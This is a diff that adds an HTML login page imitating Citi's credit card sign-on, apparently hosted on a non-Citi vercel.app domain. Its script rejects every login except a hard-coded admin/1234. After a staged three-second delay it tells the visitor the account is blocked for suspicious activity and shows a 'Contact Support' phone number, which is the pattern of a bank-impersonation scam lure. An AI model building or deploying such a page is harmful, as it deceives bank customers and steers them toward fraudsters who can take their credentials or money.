@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script defer data-domain="citionline.vercel.app" src="https://plausible.io/js/script.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Citi Credit Cards</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Basic Styling */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #fff;
+            padding: 10px 20px;
+            border-bottom: 1px solid #ccc;
+        }
+
+        .navbar img {
+            height: 30px;
+        }
+
+        .navbar .search-bar {
+            display: flex;
+            align-items: center;
+            background-color: #f4f4f4;
+            border-radius: 5px;
+            padding: 5px 10px;
+            flex: 1;
+            margin-left: 10px;
+        }
+
+        .navbar .search-bar input {
+            border: none;
+            outline: none;
+            background: transparent;
+            flex: 1;
+            margin-left: 5px;
+        }
+
+        .navbar .close-btn {
+            font-size: 1.5em;
+            cursor: pointer;
+        }
+
+        .login-section-wrapper {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+            position: relative;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px;
+            font-size: 1em;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .input-group .toggle-password {
+            position: absolute;
+            top: 50%;
+            right: 10px;
+            transform: translateY(-50%);
+            cursor: pointer;
+        }
+
+        .sign-on-button {
+            background-color: #0072ce;
+            color: #fff;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 1em;
+            width: 100%;
+        }
+
+        .error-message {
+            color: red;
+            display: none;
+            margin-top: 10px;
+            text-align: left;
+        }
+
+        .info-message {
+            background-color: #f1f1f1;
+            border-left: 4px solid #0072ce;
+            padding: 10px;
+            margin-top: 10px;
+            display: none;
+            font-size: 0.9em;
+        }
+
+        .spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            border: 5px solid #ccc;
+            border-top-color: #0072ce;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .login-options {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .login-options a {
+            color: #0072ce;
+            text-decoration: none;
+            font-size: 0.9em;
+            margin: 0 5px;
+        }
+
+        .mobile-app-banner {
+            background-color: #f9f9f9;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .mobile-app-banner img {
+            width: 20px;
+            vertical-align: middle;
+            margin-right: 5px;
+        }
+
+        /* Mobile Styles */
+        @media (max-width: 767px) {
+            .navbar .search-bar {
+                flex: none;
+                width: calc(100% - 60px);
+            }
+
+            .login-options {
+                display: flex;
+                justify-content: space-around;
+                flex-wrap: wrap;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="navbar">
+            <img src="citi-logo.png" alt="Citi Logo">
+            <div class="search-bar">
+                <input type="text" placeholder="How can we help?">
+            </div>
+            <div class="close-btn">×</div>
+        </div>
+    </header>
+
+    <div class="login-section-wrapper">
+        <div class="spinner" id="spinner"></div>
+        <form id="loginForm">
+            <div class="error-message" id="error-message">
+                <p>Error Code : 0X0X0027384 <br> Your account has been blocked due to some suspicious login attempts. <br> Contact Support : <a href="tel:18664098850">+1-866-409-8850</a></p>
+            </div>
+            <div class="info-message" id="info-message">
+                <p>If you're using auto-fill to sign on, make sure you have saved the correct sign-on information on your browser.</p>
+            </div>
+            <br> <div class="input-group">
+                <label for="userID">User ID</label>
+                <input type="text" id="userID" placeholder="User ID">
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Password">
+                <div class="toggle-password">👁️</div>
+            </div>
+            <div>
+                <input type="checkbox" id="remember">
+                <label for="remember">Remember User ID</label>
+            </div>
+            <br> <button type="submit" class="sign-on-button">Sign On</button>
+        </form>
+        <div class="login-options">
+            <a href="#">Forgot User ID</a>
+            <a href="#">Forgot Password</a>
+        </div>
+        <div class="login-options">
+            <a href="#">Register for Online Access</a>
+            <a href="#">Activate a Card</a>
+        </div>
+    </div>
+
+    <div class="mobile-app-banner">
+        <img src="citi new.png" alt="Citi Mobile">
+        Use the Citi Mobile® App
+    </div>
+
+    <script>
+        // Toggle password visibility
+        document.querySelector('.toggle-password').addEventListener('click', function () {
+            const passwordField = document.getElementById('password');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+            } else {
+                passwordField.type = 'password';
+            }
+        });
+
+        // Handle form submission
+        document.getElementById("loginForm").addEventListener("submit", function (event) {
+            event.preventDefault();
+
+            const userID = document.getElementById("userID").value;
+            const password = document.getElementById("password").value;
+            const errorMessage = document.getElementById("error-message");
+            const infoMessage = document.getElementById("info-message");
+            const spinner = document.getElementById("spinner");
+
+            // Show spinner
+            spinner.style.display = "block";
+
+            // Simulate a delay to display the error message
+            setTimeout(function () {
+                // Hide spinner
+                spinner.style.display = "none";
+
+                // Show error message if user ID or password is incorrect
+                if (userID === "" || password === "" || userID !== "admin" || password !== "1234") {
+                    errorMessage.style.display = "block";
+                    infoMessage.style.display = "block";
+                } else {
+                    errorMessage.style.display = "none";
+                    infoMessage.style.display = "none";
+                    alert("Login successful! Redirecting...");
+                }
+            }, 3000); // 3-second delay
+        });
+    </script>
+</body>
+</html>
